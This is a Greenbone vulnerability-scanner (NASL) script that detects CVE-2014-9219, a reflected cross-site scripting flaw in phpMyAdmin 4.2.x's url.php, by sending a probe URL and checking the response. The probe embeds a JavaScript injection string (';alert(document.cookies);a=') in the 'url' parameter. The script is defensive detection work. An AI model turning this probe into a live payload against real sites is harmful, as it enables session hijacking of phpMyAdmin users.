# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805306");
  script_version("2025-01-31T05:37:27+0000");
  script_cve_id("CVE-2014-9219");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-12-22 13:17:25 +0530 (Mon, 22 Dec 2014)");
  script_name("phpMyAdmin 4.x < 4.2.13.1 'url.php' XSS Vulnerability (Dec 2014)");

  script_tag(name:"summary", value:"phpMyAdmin is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Input passed via the 'url' parameter to
  url.php script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"phpMyAdmin versions 4.2.x prior to 4.2.13.1.");

  script_tag(name:"solution", value:"Update to version 4.2.13.1 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/99137");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71435");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2014-18.php");
  script_xref(name:"URL", value:"http://blog.elevenpaths.com/2014/12/phpmyadmin-fixes-xss-detected-by.html?m=1");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_phpmyadmin_http_detect.nasl");
  script_mandatory_keys("phpmyadmin/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(dont_add_port:TRUE);

url = dir + "/url.php?url=http://" + host + "/%27;alert(document.cookies);a=%27";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"';alert\(document.cookies\);a='.*</script>")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
